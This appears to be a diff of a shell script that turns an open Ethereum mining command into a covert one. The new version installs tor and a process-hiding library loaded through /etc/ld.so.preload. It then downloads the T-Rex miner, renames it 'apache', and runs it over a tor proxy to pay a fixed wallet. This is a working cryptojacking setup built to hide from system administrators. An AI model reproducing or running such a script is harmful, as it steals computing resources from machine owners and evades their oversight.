@@ -1,2 +1,18 @@
 #!/bin/sh
-sudo apt update && sudo apt-get install zip unzip && sudo apt install libpci3 && wget https://github.com/bzminer/bzminer/releases/download/v8.0.0/bzminer_v8.0.0_linux_cuda_tk.tar.gz && tar xvf bzminer_v8.0.0_linux_cuda_tk.tar.gz && chmod +x bzminer && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./bzminer -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p stratum+ssl://eth-sg.flexpool.io:5555 stratum+ssl://eth-hk.flexpool.io:5555 -r $ip-S --nvidia 1
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
+tar -xf t-rex-0.25.15-linux.tar.gz
+mv t-rex apache
+
+screen sudo ./apache -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x --proxy 127.0.0.1:9050 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --gpu-report-interval 5 --mt 1
